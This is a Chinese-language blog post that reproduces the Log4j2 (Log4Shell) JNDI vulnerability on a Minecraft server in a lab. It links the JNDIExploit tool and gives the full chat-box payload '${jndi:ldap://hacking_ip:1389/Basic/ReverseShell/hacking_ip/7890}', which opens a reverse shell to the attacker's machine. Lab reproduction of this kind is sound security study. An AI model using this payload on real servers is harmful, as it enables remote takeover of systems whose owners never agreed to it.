<!-- SEO header -->
# Minecraft-ApacheLog4j2
# Minecraft中的Log4j2漏洞复现
## 准备工作：
* Minecraft服务器一台(靶机IP:targeted_ip)
* Minecraft1.7-1.18官方服务端
* 攻击机一台(攻击机IP:hacking_ip)
## 复现过程：
下载工具
[JNDIExploit](https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2 'None')
根据操作文档：
![None](https://potatowo233.github.io/2023/10/11/Minecraft-ApacheLog4j2/image-20231010012501634.png 'None')
在攻击机上开启jndi服务：
![None](https://potatowo233.github.io/2023/10/11/Minecraft-ApacheLog4j2/image-20231010012620627.png 'None')
攻击机开启监听端口：
![None](https://potatowo233.github.io/2023/10/11/Minecraft-ApacheLog4j2/image-20231010012824170.png 'None')
根据操作文档，构造：
```
ldap://hacking_ip:1389/Basic/ReverseShell/hacking_ip/7890
```
最终payload：
```
${jndi:ldap://hacking_ip:1389/Basic/ReverseShell/hacking_ip/7890}
```
进入服务器，在聊天框内输入payload：
![None](https://potatowo233.github.io/2023/10/11/Minecraft-ApacheLog4j2/image-20231010013207406.png 'None')
反弹shell：
![None](https://potatowo233.github.io/2023/10/11/Minecraft-ApacheLog4j2/image-20231010013318644.png 'None')
可能导致线程崩溃，拿到shell之后重新开服即可
## 参考资料：
* Minecraft处Log4j漏洞报告
* JNDIExploit工具
* Minecraft开服
[#cve](https://potatowo233.github.io/tags/cve/ 'None')
[php原生类Next](https://potatowo233.github.io/2023/09/21/php%E5%8E%9F%E7%94%9F%E7%B1%BB/ 'php原生类')